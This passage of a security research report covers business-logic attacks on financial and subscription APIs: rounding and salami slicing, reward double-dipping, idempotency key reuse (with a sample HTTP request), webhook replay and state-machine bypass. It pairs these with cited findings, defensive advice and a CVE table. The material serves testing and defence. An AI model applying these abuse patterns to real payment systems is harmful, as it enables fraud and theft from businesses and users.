Currency rounding attacks exploit asymmetric rounding, floating-point precision errors, or truncation in financial calculations to systematically accumulate small gains across many transactions. The "salami slicing" pattern scales to significant financial impact.

#### Cited Findings
- A 2001 paper by Gemplus researchers first described asymmetric rounding exploitation in currency exchange. A penetration-testing firm reports still finding it in online banking systems as of 2012. — [Help Net Security](https://www.helpnetsecurity.com/2012/01/10/is-your-online-bank-vulnerable-to-currency-rounding-attacks/)
- Check Point (2025) reported a $128M exploit against Balancer V2 pools that relied on arithmetic precision loss in integer division, causing truncation errors in token calculations. — [Check Point Research](https://research.checkpoint.com/2025/how-an-attacker-drained-128m-from-balancer-through-rounding-error-exploitation/)
- The fundamental issue: binary floating-point (IEEE 754) cannot exactly represent all decimal fractions. `0.1 + 0.2 = 0.30000000000000004` in most languages. Developers should use arbitrary-precision libraries (Python `Decimal`, Java `BigDecimal`) for financial calculations. — [jsmon.sh](https://blogs.jsmon.sh/what-is-currency-rounding-vulnerability-ways-to-exploit-examples-and-impact/)
- OWASP's testing guide covers payment-logic tests including scenarios where the total stays positive while individual inputs carry negative values. — [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality)

**Attack Patterns:**
1. **Salami Slicing**: Execute thousands of micro-transactions where rounding consistently favors the attacker (e.g., converting $0.001 per transaction, where each rounds up to $0.01 on credit but rounds down to $0.00 on debit).
2. **Currency Conversion Loops**: Convert A -> B -> C -> A where rounding at each step accumulates a net gain.
3. **Precision Mismatch**: Exploit differences in precision between the API layer (2 decimal places) and the database layer (4 decimal places) to create phantom fractions.
4. **Integer Division Truncation**: In systems using integer math for currency (cents), exploit truncation in division operations (e.g., splitting a $1.01 bill three ways: 101/3 = 33 cents each = 99 cents total, with 2 cents "lost").

#### Inferences
- The Balancer V2 exploit ($128M) demonstrates that rounding errors can have catastrophic financial impact in automated systems, not just the sub-cent gains of traditional salami slicing.
- Financial APIs should use banker's rounding (round-half-to-even) and arbitrary-precision arithmetic, with explicit handling of remainder allocation.

#### Gaps
- No documented rounding exploitation in a traditional (non-DeFi) financial API from 2024-2025 was found.
- Subscription billing specific rounding issues (proration, trial periods) were not found in the search results.

---

### Referral/Reward System Abuse

#### Takeaway
Reward systems modeled as state machines are vulnerable to "Double Dip" attacks where refunds are processed but rewards are retained, as well as self-referral chains and race conditions on reward claims.

#### Cited Findings
- A 2026 arXiv paper formalizes reward engines as state machines, introduces two integrity invariants (Reward Integrity: rewards should only exist for qualifying transactions; Refund Reward Consistency: refunded transactions should not retain rewards), and maps a taxonomy of vulnerability classes to CWE and OWASP identifiers. — [arXiv 2604.16427](https://arxiv.org/pdf/2604.16427)
- The "Double Dip" attack: a customer earns cashback on a purchase, then requests a refund. If the reward engine does not claw back the cashback on refund, the customer retains both the refund and the reward. The paper notes that garbage-collecting per-transaction records after N billing cycles would re-expose the system to late-refund exploitation. — [arXiv 2604.16427](https://arxiv.org/pdf/2604.16427)
- Orchestration-style sagas that manage reward workflows have compensation steps that are the natural point for reward reversal, but if the compensation is not triggered or fails silently, the reward persists. — [Enterno Glossary](https://enterno.io/s/glossary-saga)

**Attack Patterns:**
1. **Double Dip (Refund + Keep Reward)**: Make purchase -> earn reward -> request refund -> keep reward. Exploits missing reward clawback in the refund flow.
2. **Self-Referral Chain**: Create multiple accounts, refer each to the next, and collect referral bonuses on each link. Exploits missing identity verification across accounts.
3. **Race Condition on Reward Claim**: Submit multiple simultaneous claim requests for a single reward to receive it multiple times.
4. **Late Refund Exploitation**: Wait until the reward-tracking window expires (N billing cycles), then request a refund after the system can no longer associate the refund with the reward.
5. **Reward Currency Arbitrage**: Exploit different valuation of reward points across redemption channels.

#### Inferences
- The formal state-machine model from the arXiv paper provides a rigorous framework for testing reward system integrity: every state transition (purchase, refund, reward credit, reward debit) should maintain both invariants.
- Saga pattern compensation steps should be the enforcement point for reward reversal, but they must be mandatory and verified (not fire-and-forget).

#### Gaps
- Specific bug bounty reports for referral system abuse in 2024-2025 were not found with verifiable details.

---

### Idempotency Key Exploitation

#### Takeaway
Idempotency keys, designed to prevent duplicate processing, can themselves become an attack vector when they are predictable, client-controlled without binding, or when the implementation conflates "same key" with "same intent."

#### Cited Findings
- "Each state-changing request should include a unique key. The API stores the key and rejects duplicates, even when requests arrive simultaneously." — [APISec.ai](https://www.apisec.ai/blog/race-condition-vulnerabilities-in-apis)
- The AttackMap issue tracker lists idempotency gaps as a race-condition variant: non-atomic read-modify-write operations and check-then-act patterns on balances and quotas. — [GitHub AttackMap #245](https://github.com/mlaify/AttackMap/issues/245)

**Attack Patterns:**
1. **Key Reuse Across Different Operations**: If the idempotency key is only checked for uniqueness (not bound to the specific request body), an attacker can reuse a key from a low-value transaction to "mask" a high-value one, causing the system to return the cached low-value result.
2. **Key Prediction**: Sequential or timestamp-based idempotency keys can be predicted, allowing an attacker to pre-populate the idempotency store and block legitimate transactions.
3. **Key Collision**: If the key space is small or uses a weak hash, attackers can generate collisions to prevent legitimate operations.
4. **Missing Key Enforcement**: If the API accepts requests without an idempotency key, attackers can bypass the protection entirely for race-condition attacks.
5. **Cross-User Key Pollution**: If idempotency keys are not scoped to the authenticated user, one user's key can block another user's operation.

**Example:**
```http
// Legitimate: Transfer $10
POST /api/transfer
Idempotency-Key: txn_abc123
{"from": "acct_A", "to": "acct_B", "amount": 10.00}

// Attack: Reuse key with different amount (if key is not bound to body)
POST /api/transfer
Idempotency-Key: txn_abc123
{"from": "acct_A", "to": "acct_B", "amount": 10000.00}
// System returns cached $10 result but may process $10,000 internally
```

#### Inferences
- Idempotency key implementations must bind the key to the full request body hash AND the authenticated user to prevent cross-operation and cross-user attacks.
- The key must be checked atomically with the operation (not as a separate pre-check) to prevent TOCTOU races on the idempotency check itself.

#### Gaps
- No specific CVE or bug bounty report for idempotency key exploitation was found.

---

### Subscription/Billing Logic Bypass

#### Takeaway
Subscription and billing systems are vulnerable to trial abuse, plan downgrade/upgrade manipulation, grace period exploitation, and webhook replay attacks. These attacks exploit the asynchronous and state-dependent nature of subscription management.

#### Cited Findings
- OWASP's payment testing methodology covers testing for scenarios where billing state can be manipulated between subscription tiers. — [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality)
- Business logic flaws in subscription systems "go unreported for months" because they don't trigger security alerts. — [Precursor Security](https://www.precursorsecurity.com/blog/business-logic-vulnerabilities-what-scanners-miss)

**Attack Patterns:**
1. **Infinite Trial**: Create new accounts repeatedly with the same payment method or identity to perpetually access trial periods.
2. **Downgrade-Then-Access**: Downgrade to a free plan but continue accessing premium API endpoints if access control checks the subscription status from a cache or stale session.
3. **Upgrade Without Payment**: Exploit the delay between plan upgrade (access granted) and payment processing (charge attempted) by upgrading, using premium features, then canceling before payment clears.
4. **Webhook Replay**: Replay a "payment successful" webhook to the application server, extending the subscription without actual payment. Exploits missing webhook signature verification or replay protection.
5. **Grace Period Exploitation**: After payment failure, exploit the grace period (designed to allow retry) to continue accessing paid features indefinitely by keeping the payment method in a perpetual "retry" state.
6. **Proration Manipulation**: Rapidly switching between plans to exploit rounding in prorated charges.

#### Inferences
- Subscription systems should verify access rights synchronously against the payment system at the time of each API call, not rely on cached subscription state.
- Webhook endpoints must verify signatures, check timestamps, and implement replay detection.

#### Gaps
- No specific bug bounty reports or CVEs for subscription billing bypass in 2024-2025 were found with verifiable details.
- Specific proration rounding exploits were not found in the search results.

---

### State Machine Bypass

#### Takeaway
State machine bypasses exploit missing or incomplete transition validation in multi-step processes, allowing attackers to jump to invalid states, replay transitions, or reach terminal states without completing required intermediate steps.

#### Cited Findings
- The arXiv paper on reward engines formalizes the concept: reward systems with incomplete state transition coverage are vulnerable to paths that reach a rewarded state without fulfilling the qualifying conditions. — [arXiv 2604.16427](https://arxiv.org/pdf/2604.16427)
- Business logic vulnerability scanners cannot detect state machine bypasses because they require understanding of the intended workflow, which is application-specific. — [Precursor Security](https://www.precursorsecurity.com/blog/business-logic-vulnerabilities-what-scanners-miss)

**Attack Patterns:**
1. **State Jump**: Calling a later-stage API endpoint directly (e.g., `/api/order/confirm`) without completing earlier stages (`/api/order/create`, `/api/order/pay`).
2. **State Regression**: Moving backward in the state machine (e.g., from "shipped" back to "processing") to trigger re-fulfillment or re-crediting.
3. **Parallel State Exploitation**: Initiating multiple instances of the same workflow simultaneously and completing different steps in each, then merging the results.
4. **Timeout Exploitation**: Allowing a workflow step to time out, then completing it after the timeout has triggered a compensating action, resulting in both the original action and the compensation occurring.

**Testing Approach:**
1. Map all API endpoints and their expected order of invocation.
2. Attempt to call each endpoint out of order.
3. Attempt to call terminal endpoints (confirmation, completion) directly.
4. Attempt to regress to earlier states after reaching later ones.
5. Test concurrent invocation of state-changing endpoints.

#### Inferences
- Server-side state machines should validate the current state before processing any transition, return clear errors for invalid transitions, and log attempted invalid transitions as potential attack indicators.

#### Gaps
- Specific tooling for automated state machine bypass testing was not found beyond manual testing guidance.

---

## Cross-Cutting Defensive Guidance

### Detection and Monitoring
- Business logic attacks are invisible to WAFs and traditional scanners because they use valid request syntax and semantics. Detection requires application-level monitoring of business metrics (order values, discount rates, reward issuance rates, referral patterns). — [Precursor Security](https://www.precursorsecurity.com/blog/business-logic-vulnerabilities-what-scanners-miss); [Lorikeete Security](https://lorikeetsecurity.com/blog/business-logic-vulnerabilities)
- Race conditions should be monitored via database-level anomaly detection (duplicate records, constraint violations, balance inconsistencies). — [APISec.ai](https://www.apisec.ai/blog/race-condition-vulnerabilities-in-apis)
- Microservice mesh attacks should be monitored through service mesh telemetry (unexpected traffic patterns, unauthorized service-to-service calls, anomalous pod annotations). — [Tetrate](https://tetrate.io/blog/securing-istio-addressing-critical-security-gaps-and-best-practices)

### Key CVE Reference Table (2024-2026)

| CVE | Component | CVSS | Impact | Year |
|---|---|---|---|---|
| CVE-2025-1974 | ingress-nginx | 9.8 | RCE, cluster-wide secret access | 2025 |
| CVE-2025-24030 | Envoy Gateway | - | Admin interface access via path traversal | 2025 |
| CVE-2024-27309 | Apache Kafka | - | ACL bypass during ZK-to-KRaft migration | 2024 |
| CVE-2024-36543 | Strimzi Kafka Connect | - | Topic mirroring, credential theft | 2024 |
| CVE-2024-55591 | FortiOS | 9.6 | Auth bypass to super_admin | 2024 |
| CVE-2025-11374 | HashiCorp Consul | - | DoS via KV endpoint | 2025 |
| CVE-2026-73553 | Istio/Envoy | 7.5 | RBAC bypass via path parameters | 2026 |
| CVE-2026-73511 | Istio/Envoy | 5.3 | Path matching bypass | 2026 |
| CVE-2026-23766 | Istio | - | Sidecar iptables argument injection | 2026 |
| CVE-2026-25478 | Litestar | 7.4 | CORS origin validation bypass | 2026 |
| CVE-2026-40110 | Jupyter Server | - | CORS regex bypass | 2026 |
| CVE-2026-37737 | sanic-cors | - | CORS regex bypass | 2026 |
| CVE-2026-59903 | Netty CorsHandler | - | Vary header overwrite, cache poisoning | 2026 |
